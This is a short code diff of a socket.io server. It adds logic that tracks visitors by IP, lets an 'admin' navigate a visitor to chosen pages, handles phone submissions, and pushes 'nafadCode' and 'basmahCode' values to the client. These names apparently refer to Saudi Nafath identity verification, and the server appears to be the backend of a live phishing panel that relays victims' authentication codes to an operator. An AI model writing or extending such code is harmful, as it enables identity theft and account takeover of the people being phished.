@@ -192,6 +192,16 @@ io.on('connection', socket => {
     // Admin: manual navigation
     socket.on('navigateTo', async ({ ip, page }) => {
         const user = await findOrCreateUser(ip);
+        let v = await Visit.findOne({ ip });
+
+        if (v) {
+            v.page = page;
+            v.updatedAt = new Date();
+            await v.save();
+        } else {
+            v = await Visit.create({ user: user._id, page, ip });
+        }
+
         user.location = page;
         await user.save();
         io.emit('navigateTo', { ip, page });
@@ -508,9 +518,7 @@ io.on('connection', socket => {
         await user.save();
 
         // Broadcast to all admin clients
-        socket.emit('basmahUpdated', { ip: user.ip, basmah: user.basmahCode });
         socket.emit('nafadCode', { msg: true, code: user.basmahCode ?? "00" });
-
     });
 
     socket.on('submitPhone', async (payload) => {
